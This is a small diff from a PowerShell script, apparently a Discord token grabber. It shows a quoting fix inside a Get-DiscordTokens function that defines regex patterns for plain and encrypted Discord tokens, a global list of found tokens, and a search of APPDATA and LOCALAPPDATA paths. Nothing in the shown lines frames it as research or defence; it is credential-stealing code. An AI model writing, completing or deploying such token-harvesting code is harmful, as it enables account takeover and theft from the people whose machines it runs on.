@@ -457,7 +457,7 @@ function Get-TokenInfo {
 function Get-DiscordTokens{
     # --- Global regex patterns and token storage ---
     $tokenRegex     = '[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}'
-    $encryptedRegex = 'dQw4w9WgXcQ:[^']*'
+    $encryptedRegex = "dQw4w9WgXcQ:[^']*"
     $global:FoundTokens = @()
 
     # --- Define base paths (using APPDATA and LOCALAPPDATA) ---
